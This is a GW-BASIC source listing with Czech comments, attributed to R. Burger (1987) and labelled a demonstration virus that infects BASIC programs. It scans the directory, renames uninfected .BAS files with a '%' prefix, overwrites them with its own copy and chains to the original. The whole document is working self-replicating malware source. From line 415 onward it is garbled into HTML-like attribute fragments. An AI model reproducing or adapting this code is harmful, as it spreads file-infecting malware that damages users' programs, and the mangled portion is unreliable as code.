


10 REM *12345****************************************************************
20 REM ***     demonstracni virus pro napadani zdrojovych programu v Basicu
30 REM ***     autor R.Burger 1987
31 REM ***     pracuje pod GW-BASIC,v pameti RAM se radek 9999 musi prepsat
32 REM ***     na 9999 STOP a odstartovat
33 REM ***     radek 9999 nesmi byt ukoncen CR,LF,jinak nepojede APPEND
34 REM ***     pri zmenach textu se musi zmenit promenna LENGTHVIR
35 REM ***     pri zkousce kopirujte blok pocinaje "1" v prvnim radku progra-
36 REM ***     mu (cislo radku 10) a konce pismenem "N" v 9999 RUN
37 REM ***     delka ASCII souboru musi byt 2588 bytu,soubor ma jmeno BVS.BAS
38 REM ***     pri prvnim odstartovani mejte v aktualnim dir nejaky soubor BAS
39 REM ***     a ten se zaviruje. Pozor! Spustit "GWBASIC /s:10000"
40 REM **********************************************************************
50 REM
60 REM *** Obsluha chyb
70 ON ERROR GOTO 640
80 LENGTHVIR=2588
90 VIRROOT$="BVS.BAS"
130 REM *** directory do souboru INH
150 SHELL "DIR *.BAS>INH"
160 REM *** otevrit INH a cist jmena
170 OPEN "R",1,"INH",10000
180 GET #1,1
190 LINE INPUT #1,OLDNAME$
200 LINE INPUT #1,OLDNAME$
210 LINE INPUT #1,OLDNAME$
220 LINE INPUT #1,OLDNAME$
230 ON ERROR GOTO 640
250 F=1:LINE INPUT #1,OLDNAME$
260 REM *** % ve jmenu znamena uz infikovany soubor
290 IF MID$(OLDNAME$,1,1)="%" THEN GOTO 230
300 OLDNAME$=MID$(OLDNAME$,1,12)
310 EXTENSION$=MID$(OLDNAME$,9,12)
320 MID$(EXTENSION$,1,1)="."
330 REM *** vyrobit jmeno souboru
340 F=F+1
350 IF MID$(OLDNAME$,F,1)=" " OR MID$(OLDNAME$,F,1)="." OR F=12 THEN GOTO 370
360 GOTO 340
370 OLDNAME$=MID$(OLDNAME$,1,F-1)+EXTENSION$
375 IF OLDNAME$="BVS.BAS" THEN GOTO 230
380 ON ERROR GOTO  440
390 TEST$=""
400 REM *** otevrit soubor
410 OPEN "R",2,OLDNAME$
415 IF LOF(2)<lengthvir then="" goto="" 440="" 420="" get="" #2,1="" 430="" line="" input="" #2,test$="" 440="" close="" #2="" 450="" rem="" ***="" stejny="" prvni="" radek="infekce" 480="" if="" mid$(test$,9,="" 5)="12345" then="" goto="" 230="" 490="" close="" #1="" 500="" newname$="OLDNAME$" 510="" mid$(newname$,1,1)="%" 520="" rem="" ***="" zdravy="" program="" zkopirovat="" 530="" c$="COPY " +oldname$+"="" "+newname$="" 540="" shell="" c$="" 550="" rem="" ***="" virus="" do="" zdraveho="" programu="" zkopirovat="" 560="" c$="COPY " +virroot$+"="" "+oldname$="" 570="" shell="" c$="" 580="" rem="" ***="" priznak="" viru="" a="" nove="" jmeno="" 590="" open="" oldname$="" for="" append="" as="" #1="" len="13" 600="" write="" #1,newname$="" 610="" close="" #1="" 630="" print="" "infekce="" v:";oldname$;"="" velmi="" nebezpecne!"="" 640="" rem="" ***="" start="" originalniho="" programu="" 650="" goto="" 9999="" 680="" rem="" ***="" za="" prikazem="" run="" je="" prostor="" pro="" append="" jmena.="" nesmi="" tam="" byt="" cr,lf.="" 9999="" run=""></lengthvir>